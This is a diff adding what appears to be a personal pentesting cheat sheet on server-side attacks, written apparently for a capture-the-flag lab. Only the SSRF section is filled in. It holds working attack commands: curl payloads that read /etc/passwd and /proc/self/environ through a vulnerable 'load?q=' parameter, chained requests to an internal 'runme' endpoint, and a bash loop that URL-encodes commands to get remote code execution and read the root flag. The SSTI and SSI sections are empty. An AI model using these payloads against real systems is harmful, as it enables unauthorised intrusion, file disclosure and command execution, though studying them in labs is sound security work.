@@ -1,0 +1,127 @@
+Types of Server-Side Attacks:
+- Abusing Intermediary Applications.
+- Server-Side Request Forgery (SSRF).
+- Server-Side Includes Injection (SSI).
+- Edge-Side Includes Injection (ESI).
+- Server-Side Template Injection (SSTI).
+- Extensible Stylesheet Language Transformations Server-Side Injection (XSLT).
+=============================================
+TOOLS:
+-autossrf
+-ssrfire
+-ssrfmap
+
+https://www.urlencoder.org/
+
+
+----------------------------------------------
+AJP: Apache JServ Protocol - is a wire protocol. It an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat.
+           - open AJP proxy ports (8009 TCP)
+
+----------------------------------------------
+| Exploiting SSRF vulnerabilities can lead to:
+----------------------------------------------
+-Interacting with known internal systems
+-Discovering internal services via port scans
+-Disclosing local/sensitive data
+-Including files in the target application
+-Leaking NetNTLM hashes using UNC Paths (Windows)
+-Achieving remote code execution
+==========================================================
+|We can usually find SSRF vulnerabilities in applications|
+|that fetch remote resources. When hunting for SSRF      |
+|vulnerabilities, we should look for:                    |
+----------------------------------------------------------
+-Parts of HTTP requests, including URLs
+-File imports such as HTML, PDFs, images, etc.
+-Remote server connections to fetch data
+-API specification imports
+-Dashboards including ping and similar functionalities to check server statuses
+================================================================================
+||SSRF||
+========
+- nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>
+- nc -nvlp 8080
+- curl -i -s "http://<TARGET IP>/load?q=http://<TUN IP>:8080"
+- now the netcat listener will be confirm us the ssrf
+- create a file named index.html with:
+<html>
+</body>
+<a>SSRF</a>
+<body>
+<html>
+- create a python server at listening 9090: python3 -m http.server 9090
+- TRY THIS PAYLOADS: 
+      curl -i -s "http://<TARGET IP>/load?q=ftp://<TUN IP>/index.html"
+      curl -i -s "http://10.129.217.137/load?q=http://10.10.15.6:9090/index.html
+      curl -i -s "http://10.129.217.137/load?q=file:///etc/passwd"
+      curl -i -s "http://10.129.217.137/load?q=http://internal.app.local/load\?q\=http::////127.0.0.1:5000/"
+      curl -i -s "http://10.129.217.137/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"
+      curl -i -s "http://10.129.217.137/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"
+      curl -i -s "http://10.129.217.137/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"
+- TO GET RCE:
+      function rce() {
+      while true; do
+      echo -n "# "; read cmd
+      ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
+      curl -i -s "http://10.129.217.137/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
+      echo ""
+      done
+      }
+- EXPLOIT:
+      rce
+      uname -a; hostname; whoami
+      ls
+      ls /
+      more /root/flag.txt
+
+_____________________________________
+TIPS FOR SSRF:
+-DON'T FORGET CHECK FOR: /proc/self/environ
+-ALSO CHECK FOR: load?q=file:://///proc/self/environ" -o -
+=======================================================================================================================
+=======================================================================================================================
+||SSTI||
+========
+
+
+
+
+
+
+
+
+=======================================================================================================================
+=======================================================================================================================
+||SSI||
+=======
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
